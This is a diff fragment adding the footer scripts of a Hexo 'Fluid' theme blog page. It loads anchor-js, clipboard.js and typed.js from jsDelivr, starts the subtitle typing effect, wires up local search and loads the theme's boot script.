+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
